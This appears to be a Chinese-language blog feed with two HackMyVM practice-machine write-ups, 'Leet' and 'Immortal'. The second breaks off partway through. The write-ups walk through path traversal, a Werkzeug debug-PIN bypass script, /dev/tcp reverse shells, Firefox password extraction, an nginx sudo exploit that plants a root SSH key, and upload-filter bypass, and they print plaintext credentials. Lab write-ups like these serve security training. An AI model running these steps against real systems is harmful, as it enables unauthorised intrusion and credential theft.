‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../../etc/hosts  
127.0.0.1       localhost
127.0.1.1       leet.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Êúâ‰∏™ÂüüÂêçÔºåÂä†ÂÖ•Êàë‰ª¨ÁöÑ hosts ‰∏≠ÔºåÈáçÊñ∞ËÆøÈóÆ„ÄÇ‰∏çËÉΩËØ¥ÊØ´‰∏çÁõ∏Âπ≤ÔºåÂè™ËÉΩËØ¥‰∏ÄÊ®°‰∏ÄÊ†∑ÔºåÈÇ£ËøòÊòØÁàÜÁ†¥‰∏Ä‰∏ãÁΩëÂùÄÁõÆÂΩïÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://leet.hmv:7777/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://leet.hmv:7777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 500) [Size: 14478]
/console              (Status: 200) [Size: 1563]
Progress: 7971 / 150005 (5.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8345 / 150005 (5.56%)
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

ÁàÜÂá∫ `/console` ÊàëÂ∞±ÂÅú‰∫ÜÔºåÂêéÈù¢ÂÖ®ÊòØÊä•Èîô„ÄÇËÆøÈóÆ `/console` ‰ªñË¶Å PIN ÊâçÂèØ‰ª•ÊúâÔºåÁî® whatweb ÁúãÁúã‰ªñÊòØ‰ªÄ‰πà‰∏úË•ø

```
‚îî‚îÄ$ whatweb http://leet.hmv:7777/console   
http://leet.hmv:7777/console [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.11.2], IP[192.168.205.208], Python[3.11.2], Script, Title[Console // Werkzeug Debugger], Werkzeug[3.0.1]
```

# 3.PINËé∑Âèñ

ÊòØ Werkzeug DebuggerÔºå‰ΩøÁî® google ÊêúÁ¥¢ÁúãÊúâÊ≤°ÊúâÊºèÊ¥ûÂèØ‰ª•Âà©Áî®ÔºåÊâæÂà∞‰∫Ü‰∏ÄÁØá [github ÁöÑÊñáÁ´†](https://github.com/wdahlenburg/werkzeug-debug-console-bypass)Á¨¶ÂêàÊàë‰ª¨ÁöÑÂà©Áî®Âú∫ÊôØ

ÊåâÁÖß‰ªñÁöÑÊèêÁ§∫Âà©Áî®ËÑöÊú¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ git clone https://github.com/wdahlenburg/werkzeug-debug-console-bypass.git             
Ê≠£ÂÖãÈöÜÂà∞ 'werkzeug-debug-console-bypass'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 27 (delta 10), reused 10 (delta 3), pack-reused 0 (from 0)
Êé•Êî∂ÂØπË±°‰∏≠: 100% (27/27), 8.41 KiB | 4.20 MiB/s, ÂÆåÊàê.
Â§ÑÁêÜ delta ‰∏≠: 100% (10/10), ÂÆåÊàê.
```

ÊâìÂºÄ `werkzeug-pin-bypass.py` ‰øÆÊîπÂØπÂ∫îÁÇπ

usernameÔºöÊàëÂàöÂàöÂ∞ùËØïËØª‰ªñÁöÑ ssh ÂØÜÈí•Ëøû `riva` Áî®Êà∑ÁöÑÈÉΩ‰∏çÁªôÊàëËØªÔºàÂΩìÁÑ∂Ê≤°Êúâ‰πüËØª‰∏çÂà∞ÔºâÔºåÂ∞±Âè™ÂèØËÉΩÊòØ `www-data` Âíå `riva` ‰∫ÜÔºå‰ΩÜÊòØÊàëÁåúÊòØ www-data

modname:‰ªñÁªôÁöÑÊ®°ÊùøÊòØ `/usr/local/lib/python3.9/site-packages/flask/app.py`Ôºåpython ÁâàÊú¨ÂâçÈù¢Êé¢ÊµãÂà∞‰∫ÜÔºåÊòØ 3.11.2ÔºåÈÄöÂ∏∏Ë∑ØÂæÑÂè™ÂÜôÂà∞ 3.11ÔºåÊâÄ‰ª• `/usr/local/lib/python3.11/site-packages/flask/app.py`

![image](https://github.com/user-attachments/assets/747cb5cb-511b-4a16-9338-126db5dd7ace)

ÔºàmmpÔºåÁùÅÁúºÁúã‰∏ñÁïåÔºâÂπ∏Â•ΩÊä•ÈîôÂÜô‰∫ÜÔºå‰∏çÁÑ∂ÊàëÁåúÂà∞ÊòéÂπ¥

uuid:ÊúçÂä°Âô®ÊâòÁÆ°Êé•Âè£ÁöÑ Mac Âú∞ÂùÄÔºå‰ªñÁªôÁöÑÊ®°ÊùøÊòØ `/sys/class/net/eth0/address`ÔºåËÆøÈóÆ‰∫ÜÔºåÊ≤°ÊúâËøô‰∏™Êñá‰ª∂ÔºåÂ∫îËØ•ÊòØÊç¢‰∫ÜÁΩëÂç°ÔºåÂéªÈóÆ‰∫ÜÈóÆ GPTÔºå‰ªñËØ¥ÂèØ‰ª•ÈÄöËøá `/etc/network/interfaces` Êñá‰ª∂‰∫ÜËß£

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../etc/network/interfaces             
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
allow-hotplug enp0s3
iface enp0s3 inet dhcp

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../sys/class/net/enp0s3/address
08:00:27:39:2c:58
curl: (18) end of response with 4078 bytes missing

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3            
Python 3.12.8 (main, Dec 13 2024, 13:19:48) [GCC 14.2.0] on linux
Type 'help', 'copyright', 'credits' or 'license' for more information.
&gt;&gt;&gt; ''.join('08:00:27:39:2c:58'.split(':'))
'080027392c58'
&gt;&gt;&gt; print(0x080027392c58)
8796751080536

```

Ë∑ë‰∏Ä‰∏ã `/etc/machine-id`„ÄÅ`/proc/sys/kernel/random/boot_id`„ÄÅ`/proc/self/cgroup`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../etc/machine-id        
f6791f240ce6407ea271e86b78ac3bdb
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../proc/sys/kernel/random/boot_id
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup        
 
```

/etc/machine-idÔºöf6791f240ce6407ea271e86b78ac3bdb

/proc/sys/kernel/random/boot_idÔºö

/proc/self/cgroupÔºö

Ë∑ë‰∏çÂá∫Êù•ÔºåÂÜô‰∏™ËÑöÊú¨Ë∑ëË∑ëËØïËØïÔºå‰∏çË°åÂ∞±ÂéªÊäÑÂÖ∂‰ªñÂ∏àÂÇÖÁöÑ wp[ÁãóÂ§¥]

```
#!/bin/bash

for i in {1..200}; do
  curl -s -o /tmp/response.tmp http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup
  if [ -s /tmp/response.tmp ]; then
    echo 'Attempt $i: Success'
    cat /tmp/response.tmp
    break
  else
    echo 'Attempt $i: Failed'
    rm -f /tmp/response.tmp
  fi
done
```

Ë∑ë‰∏çÂá∫Êù•ÔºåÂéª [HGBE](https://hackmyvm.eu/profile/?user=HGBE) Â∏àÂÇÖÈÇ£ÊäÑ‰∫Ü‰∏Ä‰∏™

/proc/sys/kernel/random/boot_idÔºöda68b9a7-336e-40df-879a-f38a6447bfe9

/proc/self/cgroupÔºö0::/system.slice/flaskapp.service

Ê†πÊçÆ‰ªñÁªôÁöÑËÑöÊú¨Ëé∑Âæó id

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ vim id.py                                                      
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ cat id.py   
machine_id = b''
for filename in 'machine-id', 'boot_id':
    try:
        with open(filename, 'rb') as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open('cgroup', 'rb') as f:
        machine_id += f.readline().strip().rpartition(b'/')[2]
except OSError:
    pass

print(machine_id)
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ echo 'f6791f240ce6407ea271e86b78ac3bdb' &gt; machine-id
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ echo 'da68b9a7-336e-40df-879a-f38a6447bfe9' &gt; boot_id
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ echo '0::/system.slice/flaskapp.service' &gt; cgroup  
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ chmod +x id.py  
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ python3 id.py    
b'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
```

Êï¥‰∏™‰ª£Á†ÅÊîπÂÆåÊòØËøôÊ†∑ÁöÑ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ cat werkzeug-pin-bypass.py  
  
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        'www-data',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/opt/project/venv/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
        '8796751080536',# str(uuid.getnode()),  /sys/class/net/ens33/address 
        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print('Pin: ' + rv)
```

ËøêË°å werkzeug-pin-bypass.py Ëé∑Âæó PIN

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/werkzeug-debug-console-bypass]
‚îî‚îÄ$ python3 werkzeug-pin-bypass.py
Pin: 113-565-783
```

ÊàêÂäüÁôªÂÖ•ÔºåÊúâÁÇπÂ∞¥Â∞¨ÂìàÔºå‰∏çÊòØ sstiÔºåÂè™ÊòØÂçïÁ∫ØÁöÑ python

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo tcpdump -A -n icmp  #ÂºÄ‰∏™ÁõëÂê¨
```

```
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('id')
0
&gt;&gt;&gt; os.system('ping -c2 192.168.205.141')
```

‰ªñÂõûÊòæ‰∏™ 0Ôºåping ‰∏Ä‰∏ãÁúãÊúâÊ≤°ÊúâÂåÖ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo tcpdump -A -n icmp                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:30:30.290786 IP 192.168.205.208 &gt; 192.168.205.141: ICMP echo request, id 30409, seq 1, length 64
E..T..@.@.Q_............v.....og....g&lt;...................... !'#$%&amp;'()*+,-./01234567
16:30:30.290806 IP 192.168.205.141 &gt; 192.168.205.208: ICMP echo reply, id 30409, seq 1, length 64
E..T....@.W;............v.....og....g&lt;...................... !'#$%&amp;'()*+,-./01234567
16:30:31.313700 IP 192.168.205.208 &gt; 192.168.205.141: ICMP echo request, id 30409, seq 2, length 64
E..T..@.@.P...........V.v.....og............................ !'#$%&amp;'()*+,-./01234567
16:30:31.313721 IP 192.168.205.141 &gt; 192.168.205.208: ICMP echo reply, id 30409, seq 2, length 64
E..T....@.W...........^.v.....og............................ !'#$%&amp;'()*+,-./01234567

```

ÊúâÂåÖÔºåÂºπ‰∏™ shell ÂõûÊù•

```
&gt;&gt;&gt; os.system('bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'')
```

# 4. ÊèêÊùÉ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.208] 40200
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
www-data@leet:/opt/project$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@leet:/opt/project$ sudo -l
sudo -l
Matching Defaults entries for www-data on leet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on leet:
    (riva) NOPASSWD: /usr/bin/micro

```

ÂèØ‰ª•Áî® `riva` ÊâßË°å `/usr/bin/micro` ‰ΩøÁî® [gtfobins](https://gtfobins.github.io/) ÊêúÁ¥¢Ê≤°ÊúâÁªìÊûúÔºåÈÇ£Êàë‰ª¨ÁúãÁúã‰ªñÂ∏ÆÂä©Âêß

```
www-data@leet:/opt/project$ /usr/bin/micro -h
Usage: micro [OPTIONS] [FILE]...
-clean
        Cleans the configuration directory
-config-dir dir
        Specify a custom location for the configuration directory
[FILE]:LINE:COL (if the `parsecursor` option is enabled)
+LINE:COL
        Specify a line and column to start the cursor at when opening a buffer
-options
        Show all option help
-debug
        Enable debug mode (enables logging to ./log.txt)
-version
        Show the version number and information

Micro's plugin's can be managed at the command line with the following commands.
-plugin install [PLUGIN]...
        Install plugin(s)
-plugin remove [PLUGIN]...
        Remove plugin(s)
-plugin update [PLUGIN]...
        Update plugin(s) (if no argument is given, updates all plugins)
-plugin search [PLUGIN]...
        Search for a plugin
-plugin list
        List installed plugins
-plugin available
        List available plugins

Micro's options can also be set via command line arguments for quick
adjustments. For real configuration, please use the settings.json
file (see 'help options').

-option value
        Set `option` to `value` for this session
        For example: `micro -syntax off file.c`

Use `micro -options` to see the full list of configuration options

```

Ê≤°‰ªÄ‰πàÊúâÁî®ÁöÑ‰ø°ÊÅØÔºåËøêË°å‰∏Ä‰∏ãÁúãÁúãÊòØ‰ªÄ‰πà

```
ww-data@leet:/var/www/html$ sudo -u riva /usr/bin/micro
```

![image](https://github.com/user-attachments/assets/bc8598d6-1641-4cb9-8c63-ace450ad38f9)

Âíå vim Á±ª‰ººÊñáÊú¨ÁºñËæëÂô®ÔºåÊêúÁ¥¢‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂëΩ‰ª§Ë°å

![image](https://github.com/user-attachments/assets/5b94dfee-41c9-4dc7-95d7-7e66d2a3aa09)

```
ctrl+b 
$ /bin/bash
riva@leet:/var/www/html$ 
```

ÊàêÂäüËøõÊù•ÔºåÁúã‰∫Ü‰∏ÄÂúàÈÉΩÊ≤°Êúâ‰ªÄ‰πàÂèëÁé∞,Êää linpeas.sh ‰º†‰∏äÂéªÁúãÁúãÔºå‰πüÊòØÊ≤°ÁúãÂà∞‰ªÄ‰πàÈáçË¶ÅÁöÑ‰∏úË•øÔºåÂéªÁúã‰∫Ü [HGBE](https://hackmyvm.eu/profile/?user=HGBE) ÁöÑ wpÔºåÂèëÁé∞ÊòØÊàë‰∏çÂ§üÂ§ßËÉÜÔºåÂèçÊ≠£ÊàëÊÉ≥‰∏çÂà∞‰ªé firefox ÊèêÂèñÂØÜÁ†Å

[Firefox Decrypt](https://github.com/unode/firefox_decrypt)

```
riva@leet:~$ python3 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -&gt; zbznfk37.default
2 -&gt; guu30cui.default-esr
2

Website:   chrome://FirefoxAccounts
Username: '1db9561103ca4adc9afa6357c0a0b554'
Password: '{'version':1,'accountData':{'scopedKeys':{'https://identity.mozilla.com/apps/oldsync':{'kid':'1603273389635-IxsZ6HpGK9fL9tUfdcBqwA','k':'Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg','kty':'oct'},'sync:addon_storage':{'kid':'1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U','k':'L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA','kty':'oct'}},'kSync':'43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6','kXCS':'231b19e87a462bd7cbf6d51f75c06ac0','kExtSync':'2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608','kExtKbHash':'360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85'}}'

Website:   http://leet.hmv
Username: 'riva'
Password: 'PGH$2r0co3L5QL'

Website:   https://hackmyvm.eu
Username: 'riva'
Password: 'lovelove80'

riva@leet:~$ sudo -l
[sudo] password for riva: 
Matching Defaults entries for riva on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User riva may run the following commands on leet:
    (root) /usr/sbin/nginx
```

ÁÑ∂ÂêéÂ∞±ÊòØÊàë‰ª¨ÁöÑËÄÅ‰ºôËÆ°‰∏äÂú∫‰∫ÜÔºånginx [ÊèêÊùÉÊñπÊ≥ï](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)

```
riva@leet:~$ cat exploit.sh

echo '[+] Creating configuration...'
cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo '[+] Loading configuration...'
sudo nginx -c /tmp/nginx_pwn.conf
echo '[+] Generating SSH Key...'
ssh-keygen
echo '[+] Display SSH Private Key for copy...'
cat .ssh/id_rsa
echo '[+] Add key to root user...'
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d '$(cat .ssh/id_rsa.pub)'
echo '[+] Use the SSH key to get access'


riva@leet:~$ bash exploit.sh 
riva@leet:~/.ssh$ ssh -i id_rsa root@127.0.0.1
root@leet:~#  id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:17 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPHK.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.223
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

# 1.Êâ´Êèè

`nmap` Ëµ∑ÊâãÔºåÂÖàÊé¢ÊµãÁ´ØÂè£

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap 192.168.205.223
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
Nmap scan report for 192.168.205.223
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

Ê≤°Âï•Â•ΩËØ¥ÁöÑÔºåÊúâ ftp ÊúçÂä°ÂÖàÂ∞ùËØï**ÂåøÂêçÁôªÂΩï**

---

# 2.Ë∏©ÁÇπ

## port 21

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.223     
Connected to 192.168.205.223.
220 (vsFTPd 3.0.3)
Name (192.168.205.223:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||52564|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Feb 27  2024 .
drwxr-xr-x    2 0        115          4096 Feb 27  2024 ..
-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt
226 Directory send OK.
ftp&gt; mget message.txt
mget message.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||10512|)
150 Opening BINARY mode data connection for message.txt (504 bytes).
100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA
226 Transfer complete.
504 bytes received in 00:00 (429.10 KiB/s)
ftp&gt; exit
221 Goodbye.                               
```

Êü•Áúã message.txt Êñá‰ª∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat message.txt 
Hey guys!
I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
Wishing you a long life, David.
  
Âòø,‰ºôËÆ°‰ª¨ÔºÅ
ÁªèËøáËøô‰πàÈïøÊó∂Èó¥ÔºåÊàëÂÅöÂà∞‰∫Ü„ÄÇÊ≤°ÈîôÔºå‰ºôËÆ°‰ª¨Ôºå‰ºüÂ§ßÁöÑÁèçË¥µ‰∏çÊúΩ„ÄÇÊâÄÊúâ‰∫∫ÈÉΩËßäËßéËÄåÊ≤°Êúâ‰∫∫ËÉΩÂÆûÁé∞ÁöÑÈÇ£‰∏™„ÄÇÂèóÂà∞ÊâÄÊúâ‰∫∫ÁöÑÈùíÁùêÔºåÊ≤°Êúâ‰∫∫Êã•Êúâ„ÄÇ
Áé∞Âú®Êàë‰ª¨ÂøÖÈ°ªÂ∞èÂøÉÔºå‰ºôËÆ°‰ª¨ÔºåÊàë‰ª¨ÂøÖÈ°ªÂêë‰∏ñÁïå„ÄÅÊîøÂ∫úÂíåÂÖ∂‰ªñÂç±Èô©Êú∫ÊûÑÈöêÁûíËøô‰ª∂‰∫ã„ÄÇ
‰ªñ‰ª¨ÁîöËá≥ÂèØËÉΩÂ∑≤ÁªèÂê¨ËØ¥‰∫ÜÊàë‰ª¨ÁöÑÊàêÂ∞±Ôºå‰ªñ‰ª¨Êó†Â§Ñ‰∏çÂú®ÔºÅËøôÂ∞±ÊòØÊàëÂÜ≥ÂÆöÂä†Âº∫ÊúçÂä°Âô®ÂÆâÂÖ®ÊÄßÁöÑÂéüÂõ†„ÄÇÂ¶ÇÊûú‰ªñ‰ª¨ËØïÂõæÂÖ•‰æµÊàë‰ª¨ÊÄé‰πàÂäû!!
Á•ù‰Ω†ÈïøÂØøÔºåÂ§ßÂç´„ÄÇ                       
```

Ê≤°Áî®‰ø°ÊÅØÔºåÂ∞±Ëé∑Âæó‰∏™Áî®Êà∑Âêç **David**ÔºåÈÇ£ËøõË°åÊé¢Êµã 80 ÊúçÂä°

## port 80

![image](https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695)

‰∏Ä‰∏™ÂØÜÁ†ÅËæìÂÖ•Ê°ÜÔºåÊãø burp ÁàÜÁ†¥‰∏Ä‰∏ãÔºåÊàëËøôÁàÜÁöÑÊòØÂâç 5000 Ë°åÁöÑ rockyou.txt Â≠óÂÖ∏

![image](https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea)

ÂÖ∂‰∏≠ÂØÜÁ†Å **santiago**ÔºåÁä∂ÊÄÅÁ†ÅÂíåÈïøÂ∫¶ÂÆåÂÖ®‰∏ç‰∏ÄÊ†∑ÔºåÂ∞ùËØïÁôªÂΩï

![image](https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309)

‰∏Ä‰∏™Êñá‰ª∂Â§πÁõÆÂΩïÔºåÂÖ∂‰∏≠ `chat/`Áªô‰∫ÜÊèêÁ§∫

![image](https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1)

‰∏ä‰º†ÁÇπÂú® `upload_an_incredible_message.php`ÔºåÊµÖËØï‰∫Ü‰∏Ä‰∏ã,‰∏ä‰º† `index.php` ‰∏çÊàêÂäüÔºåÊàëÂ∞±Áõ¥Êé•Êîæ burp ÁàÜÁ†¥ÂêéÁºÄ‰∫Ü

![image](https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66)

Áõ¥Êé•ÂéªÁΩëÈ°µÁúã‰∫ÜÔºå‰∏çÊÉ≥ÁúãÊä•Êñá

![image](https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018)

ÂÖ∂‰∏≠ **index.phtml** ÊòØÂèØ‰ª•ÊâßË°åÁöÑÔºåÂà∞ËøôÈáåÊàë‰ª¨Â∑≤ÁªèÊãøÂà∞‰∫Ü **www-data** ÁöÑ **shell**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                     
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 50866
Linux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux
 05:32:45 up 12 min,  0 users,  load average: 1.55, 5.77, 3.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (490): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Immortal:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@Immortal:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Feb 27  2024 .
drwxr-xr-x 18 root  root  4096 Feb 27  2024 ..
drw-------  2 david david 4096 Feb 29  2024 david
drwxr-xr-x  4 drake drake 4096 Feb 29  2024 drake
drwxr-xr-x  3 eric  eric  4096 Feb 29  2024 eric
www-data@Immortal:/home$ cd drake/
www-data@Immortal:/home/drake$ ls -la
total 32
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 .
drwxr-xr-x 5 root  root  4096 Feb 27  2024 ..
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 ...
-rw-r--r-- 1 drake drake  220 Feb 27  2024 .bash_logout
-rw-r--r-- 1 drake drake 3526 Feb 27  2024 .bashrc
drwxr-xr-x 3 drake drake 4096 Feb 27  2024 .local
-rw-r--r-- 1 drake drake  807 Feb 27  2024 .profile
-rw-r--r-- 1 drake drake   20 Feb 27  2024 user.txt
www-data@Immortal:/home/drake$ cd .../
www-data@Immortal:/home/drake/...$ ls -la
total 12
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 .
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 ..
-rw-r--r-- 1 drake drake  134 Feb 27  2024 pass.txt
www-data@Immortal:/home/drake/...$ cat pass.txt 
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456

```

ÈöæËØÑÔºåÊääÊï∞ÊçÆÂ§ÑÁêÜ‰∏Ä‰∏ã

```bash
www-data@Immortal:/home/drake/...$ cat pass.txt |awk -F ' ' '{print $1 '\n' $3}'   
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
